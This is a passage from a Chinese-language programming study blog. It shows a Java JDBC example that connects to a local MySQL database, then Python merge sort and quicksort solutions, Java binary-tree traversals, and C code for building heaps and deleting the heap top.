class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String PASSWORD = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.加载驱动程序</span></span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="comment">//2. 获得数据库连接</span></span><br><span class="line">        Connection conn = DriverManager.getConnection(URL, USER, PASSWORD);</span><br><span class="line">        <span class="comment">//3.操作数据库，实现增删改查</span></span><br><span class="line">        Statement stmt = conn.createStatement();</span><br><span class="line">        stmt.executeQuery(<span class="string">&quot;use mytest&quot;</span>);</span><br><span class="line">        ResultSet rs = stmt.executeQuery(<span class="string">&quot;SELECT sName, sAge FROM Student&quot;</span>);</span><br><span class="line">        <span class="comment">//如果有数据，rs.next()返回true</span></span><br><span class="line">        <span class="keyword">while</span>(rs.next())&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Name:&quot;</span> + rs.getString(<span class="string">&quot;sName&quot;</span>)+<span class="string">&quot; Age:&quot;</span>+rs.getInt(<span class="string">&quot;sAge&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>加载驱动程序需要进行下载相关<code>jar</code>包，然后导入，</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221028160118066.png" alt="image-20221028160118066"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221028160210079.png" alt="image-20221028160210079"></p>
<p>参考</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.runoob.com/java/java-mysql-connect.html" >Java MySQL 连接 | 菜鸟教程 (runoob.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26525215/article/details/53239123" >(47条消息) 【IDEA】向IntelliJ IDEA创建的项目导入Jar包的两种方式_谙忆的博客-CSDN博客_idea如何添加jar包</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>其中<code>rs.next()</code>相当于跳过表头，逐行打印则需要循环<code>rs.next()</code>，结果为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221028155818686.png" alt="image-20221028155818686"></p>
<p>对应表中数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221028155853564.png" alt="image-20221028155853564"></p>

        <h1 id="基础排序"   >
          <a href="#基础排序" class="heading-link"><i class="fas fa-link"></i></a><a href="#基础排序" class="headerlink" title="基础排序"></a>基础排序</h1>
      
        <h2 id="归并排序"   >
          <a href="#归并排序" class="heading-link"><i class="fas fa-link"></i></a><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2>
      <p>主要是分治思想，从大往下分，然后再合并</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">merge</span>(<span class="params">self, nums, mid, l, r</span>):</span></span><br><span class="line">        <span class="comment"># 归并两个有序数组</span></span><br><span class="line">        tmp = []</span><br><span class="line">        i,j = l,mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> (i &lt;= mid <span class="keyword">or</span> j &lt;= r):</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &lt;= nums[j]):</span><br><span class="line">                tmp.append(nums[i])</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> (i == mid + <span class="number">1</span>):</span><br><span class="line">                    tmp += nums[j:r + <span class="number">1</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmp.append(nums[j])</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> (j == r + <span class="number">1</span>):</span><br><span class="line">                    tmp += nums[i:mid + <span class="number">1</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        nums[l:r + <span class="number">1</span>] = tmp</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mergeSort</span>(<span class="params">self, nums, l, r</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (l &gt;= r):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment">#先划分</span></span><br><span class="line">        mid = <span class="built_in">int</span>((l + r) / <span class="number">2</span>)</span><br><span class="line">        self.mergeSort(nums, l, mid)</span><br><span class="line">        self.mergeSort(nums, mid + <span class="number">1</span>, r)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#再治</span></span><br><span class="line">        self.merge(nums, mid, l, r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sortArray</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        self.mergeSort(nums, <span class="number">0</span>, <span class="built_in">len</span>(nums) - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> nums</span><br></pre></td></tr></table></div></figure>




        <h2 id="快速排序"   >
          <a href="#快速排序" class="heading-link"><i class="fas fa-link"></i></a><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2>
      <p>也是分治思想，双指针，参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/sort-an-array/solution/duo-chong-pai-xu-yi-wang-da-jin-kuai-pai-wgz4/" >『 3种排序一网打尽 』 快速排序、归并排序、堆排序详解 - 排序数组 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/1652980493-wDmBKe-quick_sort.png" alt="1652980493-wDmBKe-quick_sort"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">partition</span>(<span class="params">self, nums, low, high</span>):</span></span><br><span class="line">        pivot_idx = random.randint(low,high)</span><br><span class="line">        pivot = nums[pivot_idx]</span><br><span class="line">        nums[low],nums[pivot_idx] = nums[pivot_idx],nums[low]</span><br><span class="line">        left = low</span><br><span class="line">        right = high</span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            <span class="keyword">while</span>(left &lt; right <span class="keyword">and</span> nums[right] &gt;= pivot):</span><br><span class="line">                right -= <span class="number">1</span></span><br><span class="line">            nums[left] = nums[right]</span><br><span class="line">            <span class="keyword">while</span>(left &lt; right <span class="keyword">and</span> nums[left] &lt;= pivot):</span><br><span class="line">                left += <span class="number">1</span></span><br><span class="line">            nums[right] = nums[left]</span><br><span class="line">        nums[left] = pivot</span><br><span class="line">        <span class="keyword">return</span> left</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quickSort</span>(<span class="params">self, nums,low,high</span>):</span></span><br><span class="line">        <span class="keyword">if</span>(low &gt;= high):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment">#先划分</span></span><br><span class="line">        mid = self.partition(nums,low,high)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#再治</span></span><br><span class="line">        self.quickSort(nums,low,mid-<span class="number">1</span>)</span><br><span class="line">        self.quickSort(nums,mid+<span class="number">1</span>,high)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sortArray</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        self.quickSort(nums, <span class="number">0</span>, <span class="built_in">len</span>(nums) - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> nums</span><br></pre></td></tr></table></div></figure>




        <h1 id="树"   >
          <a href="#树" class="heading-link"><i class="fas fa-link"></i></a><a href="#树" class="headerlink" title="树"></a>树</h1>
      
        <h2 id="遍历"   >
          <a href="#遍历" class="heading-link"><i class="fas fa-link"></i></a><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h2>
      <p>以下图为例子</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221017141835811.png" alt="image-20221017141835811"></p>
<ul>
<li><p>先序遍历：首先访问根节点，然后访问左子树，最后访问右子树。</p>
<p>顺序为：0-1-3-4-2-5-6</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">beforeTraverse</span><span class="params">(Node root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    System.out.println(root.val);</span><br><span class="line">    beforeTraverse(root.left);</span><br><span class="line">    beforeTraverse(root.right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
<li><p>中序遍历：首先访问左子树，然后访问根结点，最后访问右子树。</p>
<p>顺序为：3-1-4-0-5-2-6</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">beforeTraverse</span><span class="params">(Node root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    beforeTraverse(root.left);</span><br><span class="line">    System.out.println(root.val);</span><br><span class="line">    beforeTraverse(root.right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
<li><p>后序遍历：首先访问左子树，然后访问右子树，最后访问根结点。</p>
<p>顺序为：3-4-1-5-6-2-0</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">beforeTraverse</span><span class="params">(Node root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    beforeTraverse(root.left);</span><br><span class="line">    beforeTraverse(root.right);</span><br><span class="line">    System.out.println(root.val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h2 id="二叉搜索树"   >
          <a href="#二叉搜索树" class="heading-link"><i class="fas fa-link"></i></a><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h2>
      <p>二叉查找树、二叉排序树</p>
<p>若它的左子树不空，则左子树上所有结点的值均小于它的值； 若它的右子树不空，则右子树上所有结点的值均大于它的根结点的值； 它的左、右子树也分别为二叉搜索树</p>
<p>以下图为例子</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221017142607148.png" alt="image-20221017142607148"></p>
<p>那么二叉搜索树的中序遍历即为递增序列：0-1-2-3-4-5-6</p>

        <h1 id="堆"   >
          <a href="#堆" class="heading-link"><i class="fas fa-link"></i></a><a href="#堆" class="headerlink" title="堆"></a>堆</h1>
      <p>堆是一颗完全二叉树</p>
<p>要求排序时间算法复杂度为<code>O(nlogn)</code>常用堆排序</p>

        <h2 id="建堆-1"   >
          <a href="#建堆-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#建堆-1" class="headerlink" title="建堆"></a>建堆</h2>
      <p>都是从<code>idx</code>最大的非叶子结点的子树开始，将不满足大(小)顶堆的子树递归进行下沉操作</p>

        <h3 id="大顶堆"   >
          <a href="#大顶堆" class="heading-link"><i class="fas fa-link"></i></a><a href="#大顶堆" class="headerlink" title="大顶堆"></a>大顶堆</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">maxShiftDown</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>, <span class="keyword">int</span> rootIdx, <span class="keyword">int</span> heapSize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> leftIdx = rootIdx * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> rightIdx = rootIdx * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> maxIdx = rootIdx;</span><br><span class="line">    <span class="keyword">if</span>( leftIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[leftIdx] &gt; <span class="built_in">array</span>[maxIdx])&#123;</span><br><span class="line">        maxIdx = leftIdx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( rightIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[rightIdx] &gt; <span class="built_in">array</span>[maxIdx])&#123;</span><br><span class="line">        maxIdx = rightIdx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( maxIdx != rootIdx)&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = <span class="built_in">array</span>[rootIdx];</span><br><span class="line">        <span class="built_in">array</span>[rootIdx] = <span class="built_in">array</span>[maxIdx];</span><br><span class="line">        <span class="built_in">array</span>[maxIdx] = tmp;</span><br><span class="line">        maxShiftDown(<span class="built_in">array</span>, maxIdx, heapSize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buildMaxHeap</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>,<span class="keyword">int</span> heapSize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = heapSize/<span class="number">2</span> ; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        maxShiftDown(<span class="built_in">array</span>, i, heapSize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> nums[<span class="number">27</span>] = &#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">    buildMaxHeap(nums,<span class="number">27</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="小顶堆"   >
          <a href="#小顶堆" class="heading-link"><i class="fas fa-link"></i></a><a href="#小顶堆" class="headerlink" title="小顶堆"></a>小顶堆</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">minShiftDown</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>, <span class="keyword">int</span> rootIdx, <span class="keyword">int</span> heapSize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> leftIdx = rootIdx * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> rightIdx = rootIdx * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> minIdx = rootIdx;</span><br><span class="line">    <span class="keyword">if</span>( leftIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[leftIdx] &lt; <span class="built_in">array</span>[minIdx])&#123;</span><br><span class="line">        minIdx = leftIdx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( rightIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[rightIdx] &lt; <span class="built_in">array</span>[minIdx])&#123;</span><br><span class="line">        minIdx = rightIdx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(minIdx != rootIdx)&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = <span class="built_in">array</span>[rootIdx];</span><br><span class="line">        <span class="built_in">array</span>[rootIdx] = <span class="built_in">array</span>[minIdx];</span><br><span class="line">        <span class="built_in">array</span>[minIdx] = tmp;</span><br><span class="line">        minShiftDown(<span class="built_in">array</span>, minIdx, heapSize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buildMinHeap</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>,<span class="keyword">int</span> heapSize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = heapSize/<span class="number">2</span> ; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        minShiftDown(<span class="built_in">array</span>, i, heapSize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> nums[<span class="number">27</span>] = &#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">    buildMinHeap(nums,<span class="number">27</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>合起来加个<code>flag</code>即可决定大顶堆还是小顶堆了</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shiftDown</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>, <span class="keyword">int</span> rootIdx, <span class="keyword">int</span> heapSize, <span class="keyword">int</span> flag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> leftIdx = rootIdx * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> rightIdx = rootIdx * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> chooseIdx = rootIdx;</span><br><span class="line">    <span class="keyword">if</span>(flag == <span class="number">0</span>)&#123;      <span class="comment">//小顶堆</span></span><br><span class="line">        <span class="keyword">if</span>( leftIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[leftIdx] &lt; <span class="built_in">array</span>[chooseIdx])&#123;</span><br><span class="line">            chooseIdx = leftIdx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( rightIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[rightIdx] &lt; <span class="built_in">array</span>[chooseIdx])&#123;</span><br><span class="line">            chooseIdx = rightIdx;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123; <span class="comment">//大顶堆</span></span><br><span class="line">        <span class="keyword">if</span>( leftIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[leftIdx] &gt; <span class="built_in">array</span>[chooseIdx])&#123;</span><br><span class="line">            chooseIdx = leftIdx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( rightIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[rightIdx] &gt; <span class="built_in">array</span>[chooseIdx])&#123;</span><br><span class="line">            chooseIdx = rightIdx;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(chooseIdx != rootIdx)&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = <span class="built_in">array</span>[rootIdx];</span><br><span class="line">        <span class="built_in">array</span>[rootIdx] = <span class="built_in">array</span>[chooseIdx];</span><br><span class="line">        <span class="built_in">array</span>[chooseIdx] = tmp;</span><br><span class="line">        shiftDown(<span class="built_in">array</span>, chooseIdx, heapSize, flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buildHeap</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>,<span class="keyword">int</span> heapSize,<span class="keyword">int</span> flag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = heapSize/<span class="number">2</span> ; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        shiftDown(<span class="built_in">array</span>, i, heapSize,flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> nums[<span class="number">27</span>] = &#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> heapSize = <span class="number">27</span>;</span><br><span class="line">    buildHeap(nums,heapSize,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="删除-1"   >
          <a href="#删除-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#删除-1" class="headerlink" title="删除"></a>删除</h2>
      <p>一般只能删除堆顶元素</p>
<p>从删除堆顶元素，将堆尾部元素放到堆顶，然后下沉该元素</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shiftDown</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>, <span class="keyword">int</span> rootIdx, <span class="keyword">int</span> heapSize, <span class="keyword">int</span> flag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> leftIdx = rootIdx * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> rightIdx = rootIdx * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> chooseIdx = rootIdx;</span><br><span class="line">    <span class="keyword">if</span>(flag == <span class="number">0</span>)&#123;      <span class="comment">//小顶堆</span></span><br><span class="line">        <span class="keyword">if</span>( leftIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[leftIdx] &lt; <span class="built_in">array</span>[chooseIdx])&#123;</span><br><span class="line">            chooseIdx = leftIdx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( rightIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[rightIdx] &lt; <span class="built_in">array</span>[chooseIdx])&#123;</span><br><span class="line">            chooseIdx = rightIdx;</span><br><span class="line">        